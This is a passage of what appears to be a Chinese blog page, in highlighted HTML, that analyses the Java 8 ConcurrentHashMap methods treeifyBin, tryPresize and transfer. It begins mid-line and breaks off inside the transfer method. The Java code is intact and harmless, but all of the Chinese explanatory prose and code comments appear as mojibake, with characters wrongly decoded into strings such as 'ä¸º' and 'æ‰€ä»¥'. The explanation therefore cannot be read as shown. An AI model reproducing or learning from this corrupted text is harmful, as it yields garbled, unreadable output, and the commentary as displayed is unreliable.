class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; b; <span class="type">int</span> n, sc;</span><br><span class="line">    <span class="keyword">if</span> (tab != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// MIN_TREEIFY_CAPACITY ä¸º 64</span></span><br><span class="line">        <span class="comment">// æ‰€ä»¥ï¼Œå¦‚æœæ•°ç»„é•¿åº¦å°äº 64 çš„æ—¶å€™ï¼Œå…¶å®ä¹Ÿå°±æ˜¯ 32 æˆ–è€… 16 æˆ–è€…æ›´å°çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œæ•°ç»„æ‰©å®¹</span></span><br><span class="line">        <span class="keyword">if</span> ((n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">            <span class="comment">// åé¢æˆ‘ä»¬å†è¯¦ç»†åˆ†æè¿™ä¸ªæ–¹æ³•</span></span><br><span class="line">            tryPresize(n &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// b æ˜¯å¤´ç»“ç‚¹</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((b = tabAt(tab, index)) != <span class="literal">null</span> &amp;&amp; b.hash &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// åŠ é”</span></span><br><span class="line">            <span class="keyword">synchronized</span> (b) &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, index) == b) &#123;</span><br><span class="line">                    <span class="comment">// ä¸‹é¢å°±æ˜¯éå†é“¾è¡¨ï¼Œå»ºç«‹ä¸€é¢—çº¢é»‘æ ‘</span></span><br><span class="line">                    TreeNode&lt;K,V&gt; hd = <span class="literal">null</span>, tl = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">for</span> (Node&lt;K,V&gt; e = b; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                        TreeNode&lt;K,V&gt; p =</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;K,V&gt;(e.hash, e.key, e.val,</span><br><span class="line">                                              <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> ((p.prev = tl) == <span class="literal">null</span>)</span><br><span class="line">                            hd = p;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            tl.next = p;</span><br><span class="line">                        tl = p;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// å°†çº¢é»‘æ ‘è®¾ç½®åˆ°æ•°ç»„ç›¸åº”ä½ç½®ä¸­</span></span><br><span class="line">                    setTabAt(tab, index, <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(hd));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="æ‰©å®¹trypresize">æ‰©å®¹ï¼štryPresize</span></h3><p>å¦‚æœè¯´ Java8 ConcurrentHashMap çš„æºç ä¸ç®€å•ï¼Œé‚£ä¹ˆè¯´çš„å°±æ˜¯æ‰©å®¹æ“ä½œå’Œè¿ç§»æ“ä½œã€‚</p><p>è¿™ä¸ªæ–¹æ³•è¦å®Œå®Œå…¨å…¨çœ‹æ‡‚è¿˜éœ€è¦çœ‹ä¹‹åçš„ transfer æ–¹æ³•ï¼Œè¯»è€…åº”è¯¥æå‰çŸ¥é“è¿™ç‚¹ã€‚</p><p>è¿™é‡Œçš„æ‰©å®¹ä¹Ÿæ˜¯åšç¿»å€æ‰©å®¹çš„ï¼Œæ‰©å®¹åæ•°ç»„å®¹é‡ä¸ºåŸæ¥çš„ 2 å€ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é¦–å…ˆè¦è¯´æ˜çš„æ˜¯ï¼Œæ–¹æ³•å‚æ•° size ä¼ è¿›æ¥çš„æ—¶å€™å°±å·²ç»ç¿»äº†å€äº†</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">tryPresize</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="comment">// cï¼šsize çš„ 1.5 å€ï¼Œå†åŠ  1ï¼Œå†å¾€ä¸Šå–æœ€è¿‘çš„ 2 çš„ n æ¬¡æ–¹ã€‚</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> (size &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ? MAXIMUM_CAPACITY :</span><br><span class="line">        tableSizeFor(size + (size &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="keyword">while</span> ((sc = sizeCtl) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab = table; <span class="type">int</span> n;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è¿™ä¸ª if åˆ†æ”¯å’Œä¹‹å‰è¯´çš„åˆå§‹åŒ–æ•°ç»„çš„ä»£ç åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨ç®¡è¿™å—ä»£ç </span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>) &#123;</span><br><span class="line">            n = (sc &gt; c) ? sc : c;</span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (table == tab) &#123;</span><br><span class="line">                        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                        Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n];</span><br><span class="line">                        table = nt;</span><br><span class="line">                        sc = n - (n &gt;&gt;&gt; <span class="number">2</span>); <span class="comment">// 0.75 * n</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    sizeCtl = sc;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c &lt;= sc || n &gt;= MAXIMUM_CAPACITY)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tab == table) &#123;</span><br><span class="line">            <span class="comment">// æˆ‘æ²¡çœ‹æ‡‚ rs çš„çœŸæ­£å«ä¹‰æ˜¯ä»€ä¹ˆï¼Œä¸è¿‡ä¹Ÿå…³ç³»ä¸å¤§</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">rs</span> <span class="operator">=</span> resizeStamp(n);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (sc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                Node&lt;K,V&gt;[] nt;</span><br><span class="line">                <span class="keyword">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class="number">1</span> ||</span><br><span class="line">                    sc == rs + MAX_RESIZERS || (nt = nextTable) == <span class="literal">null</span> ||</span><br><span class="line">                    transferIndex &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 2. ç”¨ CAS å°† sizeCtl åŠ  1ï¼Œç„¶åæ‰§è¡Œ transfer æ–¹æ³•</span></span><br><span class="line">                <span class="comment">//    æ­¤æ—¶ nextTab ä¸ä¸º null</span></span><br><span class="line">                <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, sc + <span class="number">1</span>))</span><br><span class="line">                    transfer(tab, nt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 1. å°† sizeCtl è®¾ç½®ä¸º (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2)</span></span><br><span class="line">            <span class="comment">//     æˆ‘æ˜¯æ²¡çœ‹æ‡‚è¿™ä¸ªå€¼çœŸæ­£çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿä¸è¿‡å¯ä»¥è®¡ç®—å‡ºæ¥çš„æ˜¯ï¼Œç»“æœæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤§çš„è´Ÿæ•°</span></span><br><span class="line">            <span class="comment">//  è°ƒç”¨ transfer æ–¹æ³•ï¼Œæ­¤æ—¶ nextTab å‚æ•°ä¸º null</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc,</span><br><span class="line">                                         (rs &lt;&lt; RESIZE_STAMP_SHIFT) + <span class="number">2</span>))</span><br><span class="line">                transfer(tab, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•çš„æ ¸å¿ƒåœ¨äº sizeCtl å€¼çš„æ“ä½œï¼Œé¦–å…ˆå°†å…¶è®¾ç½®ä¸ºä¸€ä¸ªè´Ÿæ•°ï¼Œç„¶åæ‰§è¡Œ transfer(tab, null)ï¼Œå†ä¸‹ä¸€ä¸ªå¾ªç¯å°† sizeCtl åŠ  1ï¼Œå¹¶æ‰§è¡Œ transfer(tab, nt)ï¼Œä¹‹åå¯èƒ½æ˜¯ç»§ç»­ sizeCtl åŠ  1ï¼Œå¹¶æ‰§è¡Œ transfer(tab, nt)ã€‚</p><p>æ‰€ä»¥ï¼Œå¯èƒ½çš„æ“ä½œå°±æ˜¯æ‰§è¡Œ **1 æ¬¡ transfer(tab, null) + å¤šæ¬¡ transfer(tab, nt)**ï¼Œè¿™é‡Œæ€ä¹ˆç»“æŸå¾ªç¯çš„éœ€è¦çœ‹å®Œ transfer æºç æ‰æ¸…æ¥šã€‚</p><h4><span id="æ•°æ®è¿ç§»transfer">æ•°æ®è¿ç§»ï¼štransfer</span></h4><p>ä¸‹é¢è¿™ä¸ªæ–¹æ³•æœ‰ç‚¹é•¿ï¼Œå°†åŸæ¥çš„ tab æ•°ç»„çš„å…ƒç´ è¿ç§»åˆ°æ–°çš„ nextTab æ•°ç»„ä¸­ã€‚</p><p>è™½ç„¶æˆ‘ä»¬ä¹‹å‰è¯´çš„ tryPresize æ–¹æ³•ä¸­å¤šæ¬¡è°ƒç”¨ transfer ä¸æ¶‰åŠå¤šçº¿ç¨‹ï¼Œä½†æ˜¯è¿™ä¸ª transfer æ–¹æ³•å¯ä»¥åœ¨å…¶ä»–åœ°æ–¹è¢«è°ƒç”¨ï¼Œå…¸å‹åœ°ï¼Œæˆ‘ä»¬ä¹‹å‰åœ¨è¯´ put æ–¹æ³•çš„æ—¶å€™å°±è¯´è¿‡äº†ï¼Œè¯·å¾€ä¸Šçœ‹ put æ–¹æ³•ï¼Œæ˜¯ä¸æ˜¯æœ‰ä¸ªåœ°æ–¹è°ƒç”¨äº† helpTransfer æ–¹æ³•ï¼ŒhelpTransfer æ–¹æ³•ä¼šè°ƒç”¨ transfer æ–¹æ³•çš„ã€‚</p><p>æ­¤æ–¹æ³•æ”¯æŒå¤šçº¿ç¨‹æ‰§è¡Œï¼Œå¤–å›´è°ƒç”¨æ­¤æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šä¿è¯ç¬¬ä¸€ä¸ªå‘èµ·æ•°æ®è¿ç§»çš„çº¿ç¨‹ï¼ŒnextTab å‚æ•°ä¸º nullï¼Œä¹‹åå†è°ƒç”¨æ­¤æ–¹æ³•çš„æ—¶å€™ï¼ŒnextTab ä¸ä¼šä¸º nullã€‚</p><p>é˜…è¯»æºç ä¹‹å‰ï¼Œå…ˆè¦ç†è§£å¹¶å‘æ“ä½œçš„æœºåˆ¶ã€‚åŸæ•°ç»„é•¿åº¦ä¸º nï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ n ä¸ªè¿ç§»ä»»åŠ¡ï¼Œè®©æ¯ä¸ªçº¿ç¨‹æ¯æ¬¡è´Ÿè´£ä¸€ä¸ªå°ä»»åŠ¡æ˜¯æœ€ç®€å•çš„ï¼Œæ¯åšå®Œä¸€ä¸ªä»»åŠ¡å†æ£€æµ‹æ˜¯å¦æœ‰å…¶ä»–æ²¡åšå®Œçš„ä»»åŠ¡ï¼Œå¸®åŠ©è¿ç§»å°±å¯ä»¥äº†ï¼Œè€Œ Doug Lea ä½¿ç”¨äº†ä¸€ä¸ª strideï¼Œç®€å•ç†è§£å°±æ˜¯<strong>æ­¥é•¿</strong>ï¼Œæ¯ä¸ªçº¿ç¨‹æ¯æ¬¡è´Ÿè´£è¿ç§»å…¶ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå¦‚æ¯æ¬¡è¿ç§» 16 ä¸ªå°ä»»åŠ¡ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªå…¨å±€çš„è°ƒåº¦è€…æ¥å®‰æ’å“ªä¸ªçº¿ç¨‹æ‰§è¡Œå“ªå‡ ä¸ªä»»åŠ¡ï¼Œè¿™ä¸ªå°±æ˜¯å±æ€§ transferIndex çš„ä½œç”¨ã€‚</p><p>ç¬¬ä¸€ä¸ªå‘èµ·æ•°æ®è¿ç§»çš„çº¿ç¨‹ä¼šå°† transferIndex æŒ‡å‘åŸæ•°ç»„æœ€åçš„ä½ç½®ï¼Œç„¶å<strong>ä»åå¾€å‰</strong>çš„ stride ä¸ªä»»åŠ¡å±äºç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼Œç„¶åå°† transferIndex æŒ‡å‘æ–°çš„ä½ç½®ï¼Œå†å¾€å‰çš„ stride ä¸ªä»»åŠ¡å±äºç¬¬äºŒä¸ªçº¿ç¨‹ï¼Œä¾æ­¤ç±»æ¨ã€‚å½“ç„¶ï¼Œè¿™é‡Œè¯´çš„ç¬¬äºŒä¸ªçº¿ç¨‹ä¸æ˜¯çœŸçš„ä¸€å®šæŒ‡ä»£äº†ç¬¬äºŒä¸ªçº¿ç¨‹ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™ä¸ªè¯»è€…åº”è¯¥èƒ½ç†è§£å§ã€‚å…¶å®å°±æ˜¯å°†ä¸€ä¸ªå¤§çš„è¿ç§»ä»»åŠ¡åˆ†ä¸ºäº†ä¸€ä¸ªä¸ªä»»åŠ¡åŒ…ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">transfer</span><span class="params">(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt;[] nextTab)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> tab.length, stride;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// stride åœ¨å•æ ¸ä¸‹ç›´æ¥ç­‰äº nï¼Œå¤šæ ¸æ¨¡å¼ä¸‹ä¸º (n&gt;&gt;&gt;3)/NCPUï¼Œæœ€å°å€¼æ˜¯ 16</span></span><br><span class="line">    <span class="comment">// stride å¯ä»¥ç†è§£ä¸ºâ€æ­¥é•¿â€œï¼Œæœ‰ n ä¸ªä½ç½®æ˜¯éœ€è¦è¿›è¡Œè¿ç§»çš„ï¼Œ</span></span><br><span class="line">    <span class="comment">//   å°†è¿™ n ä¸ªä»»åŠ¡åˆ†ä¸ºå¤šä¸ªä»»åŠ¡åŒ…ï¼Œæ¯ä¸ªä»»åŠ¡åŒ…æœ‰ stride ä¸ªä»»åŠ¡</span></span><br><span class="line">    <span class="keyword">if</span> ((stride = (NCPU &gt; <span class="number">1</span>) ? (n &gt;&gt;&gt; <span class="number">3</span>) / NCPU : n) &lt; MIN_TRANSFER_STRIDE)</span><br><span class="line">        stride = MIN_TRANSFER_STRIDE; <span class="comment">// subdivide range</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ nextTab ä¸º nullï¼Œå…ˆè¿›è¡Œä¸€æ¬¡åˆå§‹åŒ–</span></span><br><span class="line">    <span class="comment">//    å‰é¢æˆ‘ä»¬è¯´äº†ï¼Œå¤–å›´ä¼šä¿è¯ç¬¬ä¸€ä¸ªå‘èµ·è¿ç§»çš„çº¿ç¨‹è°ƒç”¨æ­¤æ–¹æ³•æ—¶ï¼Œå‚æ•° nextTab ä¸º null</span></span><br><span class="line">    <span class="comment">//   ä¹‹åå‚ä¸è¿ç§»çš„çº¿ç¨‹è°ƒç”¨æ­¤æ–¹æ³•æ—¶ï¼ŒnextTab ä¸ä¼šä¸º null</span></span><br><span class="line">    <span class="keyword">if</span> (nextTab == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// å®¹é‡ç¿»å€</span></span><br><span class="line">            Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n &lt;&lt; <span class="number">1</span>];</span><br><span class="line">            nextTab = nt;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;      <span class="comment">// try to cope with OOME</span></span><br><span class="line">            sizeCtl = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// nextTable æ˜¯ ConcurrentHashMap ä¸­çš„å±æ€§</span></span><br><span class="line">        nextTable = nextTab;</span><br><span class="line">        <span class="comment">// transferIndex ä¹Ÿæ˜¯ ConcurrentHashMap çš„å±æ€§ï¼Œç”¨äºæ§åˆ¶è¿ç§»çš„ä½ç½®</span></span><br><span class="line">        transferIndex = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> <span class="variable">nextn</span> <span class="operator">=</span> nextTab.length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ForwardingNode ç¿»è¯‘è¿‡æ¥å°±æ˜¯æ­£åœ¨è¢«è¿ç§»çš„ Node</span></span><br><span class="line">    <span class="comment">// è¿™ä¸ªæ„é€ æ–¹æ³•ä¼šç”Ÿæˆä¸€ä¸ªNodeï¼Œkeyã€value å’Œ next éƒ½ä¸º nullï¼Œå…³é”®æ˜¯ hash ä¸º MOVED</span></span><br><span class="line">    <span class="comment">// åé¢æˆ‘ä»¬ä¼šçœ‹åˆ°ï¼ŒåŸæ•°ç»„ä¸­ä½ç½® i å¤„çš„èŠ‚ç‚¹å®Œæˆè¿ç§»å·¥ä½œåï¼Œ</span></span><br><span class="line">    <span class="comment">//    å°±ä¼šå°†ä½ç½® i å¤„è®¾ç½®ä¸ºè¿™ä¸ª ForwardingNodeï¼Œç”¨æ¥å‘Šè¯‰å…¶ä»–çº¿ç¨‹è¯¥ä½ç½®å·²ç»å¤„ç†è¿‡äº†</span></span><br><span class="line">    <span class="comment">//    æ‰€ä»¥å®ƒå…¶å®ç›¸å½“äºæ˜¯ä¸€ä¸ªæ ‡å¿—ã€‚</span></span><br><span class="line">    ForwardingNode&lt;K,V&gt; fwd = <span class="keyword">new</span> <span class="title class_">ForwardingNode</span>&lt;K,V&gt;(nextTab);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// advance æŒ‡çš„æ˜¯åšå®Œäº†ä¸€ä¸ªä½ç½®çš„è¿ç§»å·¥ä½œï¼Œå¯ä»¥å‡†å¤‡åšä¸‹ä¸€ä¸ªä½ç½®çš„äº†</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">advance</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">finishing</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">// to ensure sweep before committing nextTab</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ä¸‹é¢è¿™ä¸ª for å¾ªç¯ï¼Œæœ€éš¾ç†è§£çš„åœ¨å‰é¢ï¼Œè€Œè¦çœ‹æ‡‚å®ƒä»¬ï¼Œåº”è¯¥å…ˆçœ‹æ‡‚åé¢çš„ï¼Œç„¶åå†å€’å›æ¥çœ‹</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// i æ˜¯ä½ç½®ç´¢å¼•ï¼Œbound æ˜¯è¾¹ç•Œï¼Œæ³¨æ„æ˜¯ä»åå¾€å‰</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, bound = <span class="number">0</span>;;) &#123;</span><br><span class="line">        Node&lt;K,V&gt; f; <span class="type">int</span> fh;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä¸‹é¢è¿™ä¸ª while çœŸçš„æ˜¯ä¸å¥½ç†è§£</span></span><br><span class="line">        <span class="comment">// advance ä¸º true è¡¨ç¤ºå¯ä»¥è¿›è¡Œä¸‹ä¸€ä¸ªä½ç½®çš„è¿ç§»äº†</span></span><br><span class="line">        <span class="comment">//   ç®€å•ç†è§£ç»“å±€ï¼ši æŒ‡å‘äº† transferIndexï¼Œbound æŒ‡å‘äº† transferIndex-stride</span></span><br><span class="line">        <span class="keyword">while</span> (advance) &#123;</span><br><span class="line">            <span class="type">int</span> nextIndex, nextBound;</span><br><span class="line">            <span class="keyword">if</span> (--i &gt;= bound || finishing)</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// å°† transferIndex å€¼èµ‹ç»™ nextIndex</span></span><br><span class="line">            <span class="comment">// è¿™é‡Œ transferIndex ä¸€æ—¦å°äºç­‰äº 0ï¼Œè¯´æ˜åŸæ•°ç»„çš„æ‰€æœ‰ä½ç½®éƒ½æœ‰ç›¸åº”çš„çº¿ç¨‹å»å¤„ç†äº†</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((nextIndex = transferIndex) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                i = -<span class="number">1</span>;</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt</span><br><span class="line">                     (<span class="built_in">this</span>, TRANSFERINDEX, nextIndex,</span><br><span class="line">                      nextBound = (nextIndex &gt; stride ?</span><br><span class="line">                                   nextIndex - stride : <span class="number">0</span>))) &#123;</span><br><span class="line">                <span class="comment">// çœ‹æ‹¬å·ä¸­çš„ä»£ç ï¼ŒnextBound æ˜¯è¿™æ¬¡è¿ç§»ä»»åŠ¡çš„è¾¹ç•Œï¼Œæ³¨æ„ï¼Œæ˜¯ä»åå¾€å‰</span></span><br><span class="line">                bound = nextBound;</span><br><span class="line">                i = nextIndex - <span class="number">1</span>;</span><br><span class="line">                advance = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n || i + n &gt;= nextn) &#123;</span><br><span class="line">            <span class="type">int</span> sc;</span><br><span class="line">            <span class="keyword">if</span> (finishing) &#123;</span><br><span class="line">                <span class="comment">// 